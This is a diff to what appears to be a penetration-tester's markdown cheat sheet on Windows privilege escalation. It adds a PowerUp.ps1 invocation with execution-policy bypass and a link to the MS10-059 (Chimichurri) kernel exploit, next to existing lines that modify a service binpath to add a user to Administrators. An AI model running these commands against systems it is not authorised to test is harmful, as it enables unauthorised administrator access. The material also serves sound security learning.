@@ -14,6 +14,7 @@
 | ```accesschk64.exe -uwcv <service name>``` | Once you identify a service, get more detail by searching for the single service name |
 | ```sc query <service name>``` | We can gather the binmary path name by using the sc query command |
 | ```sc config <service name> binpath= "net localgroup administrators <username> /add"``` | Modify binpath |
+| ```powershell.exe -nop -ep bypass . .\PowerUp.ps1``` | With modified PowerUp.ps1, will run as you invoke program |
  
 | Check | Description |
 | ---------------------------- | ---------------------------- |
@@ -22,6 +23,8 @@
 | Check for autoruns | These are programs that can run with elevated permissions. If they have execissive permssions (EVERYONE) you can replace the binary and elevate access |
 | Check for Binary Path issues| See command above, its important that we can restart these services to affect them |
 | If Binary Path has issue | We can modify the path to our malicious payload, add your self to Administrators group, or use other techniques |
+| Check with PowerUp.ps1 | Make sure you have modified the script to Invoke-AllChecks |
+| Older Windows OS Win7, Win2008 | Check MS10-059 (Chimichurri) ```https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri``` |
 
 ## Common Location for WSL.exe
 ```
